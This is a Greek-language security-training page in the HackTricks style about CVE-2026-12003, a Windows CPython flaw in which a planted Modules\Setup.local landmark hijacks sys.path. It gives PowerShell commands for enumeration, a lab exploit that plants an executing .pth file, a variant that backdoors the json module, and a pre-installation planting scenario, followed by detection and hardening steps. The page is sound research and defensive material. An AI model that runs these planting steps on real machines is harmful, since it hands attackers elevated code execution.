# Windows CPython Build-Landmark και Hijacking του `sys.path`

{{#include ../../../banners/hacktricks-training.md}}

Ένα runtime μπορεί να διατηρεί relative paths που προορίζονταν μόνο για το build tree του. Αν ένα εγκατεστημένο privileged runtime επιλύει ένα από αυτά τα paths σε directory εγγράψιμο από low-privilege χρήστη, ένας attacker μπορεί να τοποθετήσει το αναμενόμενο **build landmark** και να κάνει το runtime να εμπιστευτεί ένα alternative library prefix. Το CVE-2026-12003 είναι ένα παράδειγμα Windows CPython: ένα τοποθετημένο `Modules\Setup.local` μπορεί να ανακατευθύνει την καταχώριση της standard library στο `sys.path` χωρίς τροποποίηση της προστατευμένης Python installation.<sup>[[1]](#references)[[2]](#references)</sup>

## Αλυσίδα κατασκευής path του CPython

Affected Windows builds compiled `VPATH=..\..` και το εξέθεσαν ως `sys._vpath`. Το ευάλωτο fallback στο `Modules/getpath.py` αντιμετώπιζε το `VPATH\Modules\Setup.local` ως ένδειξη ότι ο interpreter εκτελούνταν από source tree· η παρακάτω ροή δεδομένων μετατρέπει αυτήν την build-time τιμή σε runtime search-path primitive.<sup>[[1]](#references)[[2]](#references)</sup>

| Στάδιο | Derived value για `C:\Program Files\Python314\python.exe` |
| --- | --- |
| Compiled build path | `VPATH=..\..` |
| Runtime build landmark | `C:\Program Files\Python314\..\..\Modules\Setup.local` |
| Attacker-created landmark | `C:\Modules\Setup.local` |
| Selected `build_prefix` | `C:\` |
| Selected standard library | `C:\Lib` |
| Result | Το attacker-controlled `C:\Lib` προστίθεται στο `sys.path` |

Ο έλεγχος είναι ένα fallback που χρησιμοποιείται όταν το πιο συγκεκριμένο `pybuilddir.txt` δίπλα στο executable απουσιάζει ή δεν είναι αναγνώσιμο. Αυτό έχει σημασία επειδή ένας low-privilege χρήστης μπορεί να μην μπορεί να τροποποιήσει το `C:\Program Files\Python314`, αλλά να μπορεί ακόμη να δημιουργήσει νέα directories στο `C:\`. Η μεταγενέστερη privileged διεργασία `python.exe` φορτώνει Python code χρησιμοποιώντας το δικό της access token.<sup>[[1]](#references)[[2]](#references)</sup>

### Προαπαιτούμενα

Αντιμετωπίστε το ως privilege boundary μόνο όταν ισχύουν όλες οι παρακάτω συνθήκες:<sup>[[1]](#references)[[2]](#references)</sup>

- Ο στόχος είναι affected **Windows CPython** build· το ευάλωτο path logic δεν αποτελεί ιδιότητα της Python language.
- Το directory που προκύπτει από την επίλυση του `..\..` από το directory που περιέχει το `python.exe` επιτρέπει σε έναν less-privileged χρήστη να δημιουργήσει το landmark και το `Lib` tree.
- Ένας higher-privileged χρήστης, service, installer ή software-deployment account εκκινεί αργότερα αυτόν τον interpreter.
- Καμία path-isolation configuration δεν παρακάμπτει το vulnerable discovery path.

## Enumeration

Επιθεωρήστε τόσο την compiled value όσο και το effective search path. Μια εκτεθειμένη τιμή `..\..` αποτελεί χρήσιμο lead, αλλά δεν αποδεικνύει exploitability: επιλύστε επίσης το path, ελέγξτε τα ACLs και επιβεβαιώστε ότι ένα planted landmark θα βρίσκεται εκτός της protected installation.<sup>[[1]](#references)[[2]](#references)</sup>
```powershell
python -c "import os,sys; print(sys.executable); print(getattr(sys,'_vpath',None)); print(*sys.path, sep='\n')"

$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$prefix = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
$prefix
icacls $prefix
```
Μην περιορίζετε την αξιολόγηση στους official installers. Για κάθε product που περιλαμβάνει το `python.exe`, επιλύστε το `sys._vpath` σε σχέση με τον πραγματικό κατάλογο του executable και ελέγξτε τα ACLs στις resulting τοποθεσίες `Modules` και `Lib`. Μια βαθύτερη διαδρομή εγκατάστασης μπορεί να επιλύεται σε διαφορετικό writable application ή vendor directory αντί για το `C:\`.<sup>[[1]](#references)</sup>

## Ροή εργασίας exploitation στο lab

Το παρακάτω lab PoC αντικατοπτρίζει επαρκές μέρος του legitimate runtime κάτω από το επιλεγμένο prefix, ώστε να αρχικοποιηθεί η Python, προσθέτει μια executable γραμμή `.pth` και, τέλος, δημιουργεί το landmark. Δημιουργήστε το payload πριν από το landmark, ώστε να αποφύγετε να παραμείνει προσωρινά ο interpreter στραμμένος σε ένα incomplete library tree.<sup>[[1]](#references)</sup>
```powershell
$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$root = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
robocopy /E "$pythonDir\Lib" "$root\Lib" | Out-Null
robocopy /E "$pythonDir\DLLs" "$root\Lib" | Out-Null
New-Item "$root\Lib\site-packages" -ItemType Directory -Force | Out-Null
'import subprocess;subprocess.run(["cmd.exe","/c","whoami > %TEMP%\\py-landmark.txt"],shell=False)' |
Set-Content "$root\Lib\site-packages\audit.pth" -Encoding Ascii
New-Item "$root\Modules" -ItemType Directory -Force | Out-Null
New-Item "$root\Modules\Setup.local" -ItemType File -Force | Out-Null
```
Κατά την κανονική αρχικοποίηση του site, η Python επεξεργάζεται αρχεία `.pth` σε αναγνωρισμένους καταλόγους site-packages. Εκτελούνται μόνο οι γραμμές που ξεκινούν με `import` και ακολουθούνται από κενό χαρακτήρα, ενώ η εκτελέσιμη εντολή πρέπει να παραμένει σε μία φυσική γραμμή· το `python -S` καταστέλλει την αυτόματη εισαγωγή του `site` και, επομένως, αυτό το trigger.<sup>[[1]](#references)[[4]](#references)</sup>

### Εναλλακτική που ενεργοποιείται μέσω import

Η εκτέλεση κατά την εκκίνηση δεν είναι απαραίτητη. Μετά την αναπαραγωγή του νόμιμου tree βιβλιοθήκης, τοποθετήστε backdoor σε ένα module που ένα privileged script εισάγει προβλέψιμα. Για παράδειγμα, η προσθήκη κώδικα στο planted `Lib\json\__init__.py` εκτελείται όταν το victim κάνει import το `json`· η επιλογή ενός αξιόπιστου, αλλά όχι καθολικά εισαγόμενου module μπορεί να κάνει το trigger λιγότερο θορυβώδες.<sup>[[1]](#references)</sup>
```powershell
'open(r"C:\Windows\Temp\json-import-token.txt","w").write(__import__("subprocess").check_output(["whoami"]).decode())' |
Add-Content "$root\Lib\json\__init__.py" -Encoding Ascii
```
Αυτή η παραλλαγή εξακολουθεί να κληρονομεί το token της διαδικασίας importing, αλλά εξαρτάται από το target application να κάνει import το τροποποιημένο module. Διατηρήστε την αρχική συμπεριφορά του module κατά τη δοκιμή πραγματικού software, διαφορετικά το import μπορεί να αποτύχει πριν ολοκληρωθεί το προβλεπόμενο privileged workflow.<sup>[[1]](#references)</sup>

## Pre-installation planting

Το Search-path planting μπορεί να προηγηθεί της εγκατάστασης. Ένας χρήστης με χαμηλά privileges μπορεί να προετοιμάσει το μελλοντικό tree `Lib` και το `Modules\Setup.local`, και στη συνέχεια να περιμένει από ένα privileged software portal, help-desk workflow ή deployment system να εκτελέσει εγκατάσταση για όλους τους users. Installers που εκκινούν τον νέο interpreter για να εγκαταστήσουν packages ή να κάνουν precompile τη standard library μπορούν να ενεργοποιήσουν το payload υπό τον deployment account, χωρίς administrator να ανοίξει χειροκίνητα το Python.<sup>[[1]](#references)</sup>

Αυτό αλλάζει επίσης το deployment review: ελέγχετε τα writable ancestors και τους προϋπάρχοντες landmark/library directories **πριν** εγκαταστήσετε ή αναβαθμίσετε ένα bundled runtime, αντί να ελέγχετε μόνο το τελικό installation directory μετά το deployment.<sup>[[1]](#references)</sup>

## Detection and hardening

Χρήσιμα host pivots είναι το μη αναμενόμενο landmark και library tree, ακολουθούμενα από ένα privileged Python launch. Αναζητήστε `Modules\Setup.local`, `*.pth` στο root-level ή σε διαφορετική από την αναμενόμενη θέση `Lib\site-packages`, αντιγραμμένα standard-library packages και module files των οποίων ο owner ή ο χρόνος δημιουργίας διαφέρει από αυτόν του protected installation. Συσχετίστε τη δημιουργία τους από standard user με elevated `python.exe` που εκκινεί `cmd.exe`, `powershell.exe`, account-management tools ή άλλα ασυνήθιστα children.<sup>[[1]](#references)</sup>
```powershell
Get-Item C:\Modules\Setup.local -ErrorAction SilentlyContinue | Format-List FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib\site-packages -Filter *.pth -ErrorAction SilentlyContinue |
Select-Object FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib -Recurse -File -ErrorAction SilentlyContinue |
Get-Acl | Where-Object Owner -notmatch 'TrustedInstaller|Administrators|SYSTEM'
```
Η upstream διόρθωση καταργεί το fallback `VPATH\Modules\Setup.local` και καθιστά το `pybuilddir.txt` τον μοναδικό δείκτη του build-tree. Προτιμήστε ένα fixed build ή μια per-user εγκατάσταση που διαχειρίζεται ο τρέχων Python install manager. Όπου η αναβάθμιση είναι προσωρινά αδύνατη, προστατεύστε τον resolved ancestor και δημιουργήστε εκ των προτέρων το `Modules` με restrictive ACLs· τα ελεγχόμενα αρχεία `._pth` ή το `PYTHONHOME` μπορούν επίσης να αλλάξουν το discovery, αλλά απαιτούν testing συμβατότητας της εφαρμογής.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [Bishop Fox - CVE-2026-12003: Windows CPython Search-Path Hijacking και Local Privilege Escalation](https://bishopfox.com/blog/python-software-foundation-python-3-11-0a3-to-3-15-0b2)
- [2] [CPython issue #151544 - Τα in-tree search paths μπορούν να ενεργοποιηθούν χωρίς τροποποίηση του install directory](https://github.com/python/cpython/issues/151544)
- [3] [CPython pull request #151545 - Κατάργηση του fallback `VPATH/Modules/Setup.local`](https://github.com/python/cpython/pull/151545)
- [4] [Python documentation - Αρχεία διαμόρφωσης path του `site`](https://docs.python.org/3/library/site.html)
{{#include ../../../banners/hacktricks-training.md}}
